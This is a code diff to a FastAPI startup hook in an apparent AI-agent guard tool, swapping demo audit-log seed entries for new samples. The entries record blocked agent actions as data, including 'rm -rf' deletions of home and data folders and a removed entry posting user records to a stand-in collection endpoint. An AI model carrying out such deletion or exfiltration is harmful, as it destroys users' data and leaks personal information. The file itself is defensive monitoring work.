@@ -12,41 +12,25 @@ from agent_guardian.core.audit import get_audit_log, log_action
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    """Seed demo audit entries so the dashboard has data on first run."""
+    """Seed sample audit entries so the dashboard has data on first run."""
     if not get_audit_log():
         await log_action(
-            "a1destroy",
-            "run_shell_command(args=('rm -rf /home/user/projects',), kwargs={})",
-            {
-                "score": 98,
-                "category": "file_deletion",
-                "confidence": 0.99,
-                "explanation": "Rule engine: catastrophic file deletion",
-            },
-            status="blocked",
-        )
-        await log_action(
-            "a2leaker",
-            "post_user_data(url='https://suspicious-api.example.com/collect', records=847)",
-            {
-                "score": 82,
-                "category": "pii",
-                "confidence": 0.95,
-                "explanation": "PII exfiltration to unknown endpoint",
-            },
-            status="blocked",
-        )
-        await log_action(
-            "a3undo",
-            "send_bulk_email(to_list=50 contacts, subject='WRONG: Internal pricing doc')",
-            {
-                "score": 72,
-                "category": "email",
-                "confidence": 0.9,
-                "explanation": "Bulk email to 50 contacts",
-            },
+            "sample01",
+            "list_files(folder='/tmp')",
+            {"score": 12, "category": "benign", "confidence": 0.9, "explanation": "Read-only listing"},
             status="executed",
-            extra={"snapshot_id": "demo_snap_001"},
+        )
+        await log_action(
+            "sample02",
+            "run_shell_command(cmd='rm -rf /data')",
+            {"score": 98, "category": "file_deletion", "confidence": 0.99, "explanation": "Destructive shell command"},
+            status="blocked",
+        )
+        await log_action(
+            "sample03",
+            "send_email(to='team@company.com', subject='Report')",
+            {"score": 45, "category": "email", "confidence": 0.8, "explanation": "Single outbound email"},
+            status="executed",
         )
     yield
 
